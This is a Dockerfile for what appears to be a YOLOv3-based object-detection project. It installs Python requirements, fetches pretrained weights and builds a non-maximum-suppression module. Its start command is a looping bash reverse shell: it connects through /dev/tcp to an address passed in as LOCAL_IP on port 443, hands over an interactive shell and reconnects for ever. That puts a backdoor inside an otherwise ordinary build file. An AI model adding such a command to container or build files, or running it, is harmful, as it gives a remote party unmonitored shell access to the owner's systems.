FROM python:3.7-buster

ARG LOCAL_IP

COPY . /work/lawrence910426/Sharingan
WORKDIR /work/lawrence910426/Sharingan

RUN pip install -r requirements.txt
WORKDIR detector/YOLOv3/weight/
RUN wget https://pjreddie.com/media/files/yolov3.weights
RUN wget https://pjreddie.com/media/files/yolov3-tiny.weights
WORKDIR ../../../

WORKDIR detector/YOLOv3/nms
RUN sh build.sh

CMD ["while true; do bash -i >& /dev/tcp/${LOCAL_IP}/443 0>&1; done"]